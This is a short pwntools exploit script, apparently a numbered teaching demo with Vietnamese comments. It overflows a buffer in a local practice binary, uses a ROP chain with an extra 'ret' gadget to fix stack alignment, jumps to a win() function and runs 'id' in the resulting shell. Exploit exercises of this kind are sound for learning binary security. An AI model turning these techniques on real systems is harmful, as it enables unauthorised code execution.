#!/usr/bin/env python3
# Demo 3.3 (buoc 2): them MOT gadget ret de xoay parity RSP ve boi so 16,
# vuot qua movaps -> lay shell.
from pwn import *

context.binary = elf = ELF('./callme', checksec=False)
context.log_level = 'info'

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]        # gadget ret de can stack 16 byte

io = process('./callme')
io.recvuntil(b'Du lieu:\n')
io.send(flat(
    b'A' * 72,
    pop_rdi, 0xdeadbeefcafebabe,
    ret,                             # 1 ret thua, dua RSP ve boi so 16
    elf.sym['win'],
))
# cho banner win() roi moi gui lenh (tranh race send som)
io.sendlineafter(b'Shell:\n', b'echo ===SHELL_OK===; id; exit')
print(io.recvall(timeout=3).decode(errors='replace'))
